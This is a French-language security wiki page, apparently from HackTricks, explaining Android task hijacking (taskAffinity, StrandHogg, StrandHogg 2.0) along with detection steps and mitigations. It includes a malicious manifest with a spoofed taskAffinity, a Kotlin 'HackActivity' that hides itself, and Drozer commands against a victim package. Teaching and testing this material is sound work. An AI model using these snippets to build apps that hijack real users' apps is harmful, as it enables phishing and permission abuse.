# Détournement de Tâches Android

{{#include ../../banners/hacktricks-training.md}}

## Tâches, Back Stack et Activités au Premier Plan

Dans Android, une **tâche** est essentiellement un ensemble d'activités avec lesquelles les utilisateurs interagissent pour accomplir un travail spécifique, organisées dans un **back stack**. Ce stack ordonne les activités en fonction de leur ouverture, l'activité la plus récente étant affichée en haut comme l'**activité au premier plan**. À tout moment, seule cette activité est visible à l'écran, faisant partie de la **tâche au premier plan**.

Voici un aperçu rapide des transitions d'activités :

- **Activité 1** commence comme la seule activité au premier plan.
- Le lancement de **l'Activité 2** pousse **l'Activité 1** dans le back stack, amenant **l'Activité 2** au premier plan.
- Le démarrage de **l'Activité 3** déplace **l'Activité 1** et **l'Activité 2** plus loin dans le stack, avec **l'Activité 3** maintenant devant.
- La fermeture de **l'Activité 3** ramène **l'Activité 2** au premier plan, mettant en avant le mécanisme de navigation des tâches simplifié d'Android.

![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image (698).png>)

---

## Attaques par Affinité de Tâche

`taskAffinity` indique à Android à quelle tâche une `Activity` *préférerait* appartenir. Lorsque deux activités partagent la même affinité, **Android est autorisé à les fusionner dans le même back stack même si elles proviennent de différents APKs**.

Si un attaquant peut placer une activité malveillante à la **racine** de ce stack, chaque fois que la victime ouvre l'application légitime, l'interface utilisateur malveillante sera la première chose que l'utilisateur verra – parfait pour le phishing ou les demandes d'autorisation abusives.

La surface d'attaque est plus large que ce que de nombreux développeurs pensent car **chaque activité hérite automatiquement d'une affinité égale au nom du package de l'application** (à moins que le développeur ne définisse `android:taskAffinity=""`). Par conséquent, *ne rien faire* laisse déjà l'application ouverte au détournement de tâches sur les versions d'Android antérieures à 11.

### Scénario classique "singleTask / StrandHogg"

1. L'attaquant déclare une activité avec :
```xml
<activity android:name=".EvilActivity"
android:exported="true"
android:taskAffinity="com.victim.package"
android:launchMode="singleTask" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
2. L'application malveillante est lancée une fois afin que la tâche (avec l'affinité falsifiée) existe dans les tâches récentes.
3. Lorsque l'utilisateur ouvre plus tard la véritable application, Android constate qu'il y a déjà une tâche dont l'**affinité racine correspond au package** et amène simplement cette tâche au premier plan.
4. L'interface utilisateur de l'attaquant est affichée en premier.

### Variante par défaut–Affinité (sans `singleTask`) – Étude de cas Caller ID

La vulnérabilité signalée dans l'application **Caller ID (caller.id.phone.number.block)** montre que l'attaque *fonctionne également* contre le mode de lancement par défaut `standard` :

1. L'application attaquante crée une fausse activité racine et se cache immédiatement :
```kotlin
class HackActivity : AppCompatActivity() {
override fun onCreate(savedInstanceState: Bundle?) {
super.onCreate(savedInstanceState)
moveTaskToBack(true)   // garder la tâche dans les récentes mais hors de vue
}
}
```
2. Le manifeste doit simplement copier le package de la victime dans `taskAffinity` :
```xml
<activity android:name=".HackActivity"
android:exported="true"
android:taskAffinity="com.caller.id.phone.number.block" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
3. Dès que l'utilisateur installe et ouvre l'application malveillante **une fois**, une tâche dont l'affinité est égale au package de la victime existe (mais reste en arrière-plan).
4. Lorsque la véritable application Caller ID est lancée, Android réutilise cette tâche et amène `HackActivity` au premier plan → fenêtre de phishing/abus d'autorisation.

> NOTE : À partir de **Android 11 (API 30)**, le système ne place *pas* deux packages qui ne font pas partie du même UID dans la même tâche par défaut, atténuant cette variante particulière. Les versions antérieures restent vulnérables.

---

### StrandHogg 2.0 (CVE-2020-0096) – Détournement de tâche basé sur la réflexion

Le bulletin de sécurité de Google de mai 2020 a corrigé une variante plus avancée appelée **StrandHogg 2.0**. L'exploit **ne repose pas du tout sur `taskAffinity`** ; il utilise plutôt la *réflexion* pour insérer dynamiquement l'activité de l'attaquant en haut de *toutes* les tâches en cours, contournant complètement la restriction "UID partagé" introduite par Android 11.

Points clés :

* Une application malveillante sans autorisation peut, une fois ouverte, itérer sur les tâches en cours et appeler des API cachées pour **re-parenté** sa propre activité dans n'importe quelle tâche.
* Comme l'activité est insérée après l'exécution, ni `launchMode` ni l'analyse statique du manifeste ne peuvent détecter l'attaque à l'avance.
* Corrigé en rétroportant un contrôle dans **Android 8.0/8.1/9** (SPL de mai 2020). **Android 10 et versions ultérieures ne sont pas affectés.**

La détection sur les appareils non corrigés peut être effectuée avec `adb shell dumpsys activity activities` et en surveillant les activités suspectes dont le nom de package diffère de l'*affinité* de la tâche.

L'atténuation pour les appareils anciens est la même que pour le détournement de tâches classique **plus** la vérification à l'exécution (par exemple, en appelant [`ActivityManager#getRunningTasks`](https://developer.android.com/reference/android/app/ActivityManager#getRunningTasks(int)) et en validant votre propre nom de package).

---

## Liste de Contrôle pour la Détection & l'Exploitation

1. **Revue statique** – Extraire `AndroidManifest.xml` de l'APK cible et vérifier que chaque `<activity>` (ou l'élément global `<application>`) contient `android:taskAffinity=""` (vide) **ou** une valeur personnalisée. Outils tels que :
```bash
# Utilisation d'apkanalyzer (Android SDK)
apkanalyzer manifest print app.apk | grep -i taskaffinity

# Utilisation d'AXMLPrinter2
java -jar AXMLPrinter2.jar AndroidManifest.xml | grep taskAffinity
```
2. **Revue dynamique** – Sur l'appareil, ouvrez l'application cible et listez les tâches :
```bash
adb shell dumpsys activity activities | grep -A3 "TASK" | grep -E "Root|affinity"
```
Une tâche dont l'affinité racine est égale au package de la victime mais dont l'activité supérieure appartient à un *autre* package est un signal d'alarme.
3. Créez une application malveillante comme décrit ci-dessus, ou utilisez **[Drozer](https://github.com/WithSecureLabs/drozer)** :
```bash
drozer console connect
run app.activity.start --component com.victim/.MainActivity --action android.intent.action.MAIN
run app.activity.info com.victim
```

---

## Atténuation

Les développeurs devraient :

* Définir explicitement `android:taskAffinity=""` au niveau de `<application>` (recommandé) **ou** donner à chaque activité une affinité unique et privée.
* Pour les écrans très sensibles, combiner ce qui précède avec `android:launchMode="singleInstance"` ou des protections modernes [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode).
* Mettre à jour la `targetSdkVersion` de l'application et appliquer les changements de comportement **Android 11** où les tâches ne sont pas partagées entre les packages par défaut.
* Cibler **Android 12 (API 31) ou supérieur** afin que l'attribut obligatoire `android:exported` force les développeurs à auditer chaque composant accessible de l'extérieur.
* Envisager une auto-défense à l'exécution : interroger périodiquement `ActivityTaskManager` pour s'assurer que le package de votre activité supérieure correspond au vôtre.

---

## Techniques de Détournement d'UI Connexes

Le détournement de tâches est souvent combiné avec ou remplacé par **tapjacking** (tromperie d'UI basée sur des superpositions). La recherche **TapTrap** de 2025 a montré que des activités *entièrement transparentes* et *animées* peuvent contourner les restrictions de toucher de superposition introduites dans Android 12–14 et tromper encore les utilisateurs pour qu'ils accordent des autorisations dangereuses. Bien que TapTrap ne soit pas strictement un détournement de *tâche*, l'objectif final (clics de phishing) est identique – donc les évaluations modernes devraient vérifier les deux surfaces d'attaque.

---

## Références

- [https://blog.dixitaditya.com/android-task-hijacking/](https://blog.dixitaditya.com/android-task-hijacking/)
- [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
- [Mauvaise configuration du manifeste Android menant à un détournement de tâches dans l'application Caller ID](https://github.com/KMov-g/androidapps/blob/main/caller.id.phone.number.block.md)
- [https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)
- [Promon – StrandHogg 2.0 (CVE-2020-0096) rapport technique](https://promon.io/resources/downloads/strandhogg-2-0-new-serious-android-vulnerability)
- [USENIX 2025 – TapTrap : Tapjacking basé sur l'animation sur Android](https://www.usenix.org/conference/usenixsecurity25/presentation/beer)

{{#include ../../banners/hacktricks-training.md}}
